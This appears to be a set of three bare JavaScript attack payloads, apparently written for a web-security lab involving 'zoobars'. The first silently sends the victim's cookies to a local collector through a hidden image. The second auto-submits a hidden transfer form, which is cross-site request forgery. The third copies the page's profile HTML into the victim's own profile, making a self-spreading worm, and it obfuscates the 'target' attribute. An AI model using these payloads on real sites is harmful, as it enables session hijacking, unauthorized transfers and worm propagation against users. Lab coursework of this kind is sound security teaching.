<script>
  var img=new Image();
  img.src="http://127.0.0.1:9999?cookies="+document.cookie;
  img.style.display="none";
  document.getElementsByTagName("a")[0].appendChild(img);
</script>

<script>
  var frm = document.createElement("iframe");
  frm.name="frm";
  frm.style.display="none";
  document.body.appendChild(frm);
 
  var f = document.createElement("form");
  f.method="POST";
  f.action="transfer.php";
  f["tar"+"get"]="frm";
 
  var i1 = document.createElement("input");
  i1.type="text";
  i1.name="recipient";
  i1.value="xss";
 
  var i2 = document.createElement("input");
  i2.type="text";
  i2.name="zoobars";
  i2.value="1";
 
  var b = document.createElement("input");
  b.type="text"
  b.name="submission";
  b.value="1";
 
  f.appendChild(i1);
  f.appendChild(i2);
  f.appendChild(b);

  frm.appendChild(f);
 
  f.submit();           
</script>


<script>
  var frm2 = document.createElement("iframe");
  frm2.name="ifr";
  frm2.style.display="none";

  var f2=document.createElement("form");
  f2.action="index.php";
  f2.method="POST";
  f2.name="profileform";
  f2["tar"+"get"]="ifr";

  var t=document.createElement("textarea");
  t.name="profile_update";
  t.value=document.getElementById("profile").innerHTML;
  f2.appendChild(t);

  var i=document.createElement("input");
  i.name="profile_submit";
  i.type="text";
  i.value="Save";
  f2.appendChild(i);

  frm2.appendChild(f2);
  document.body.appendChild(frm2);
  f2.submit();
</script>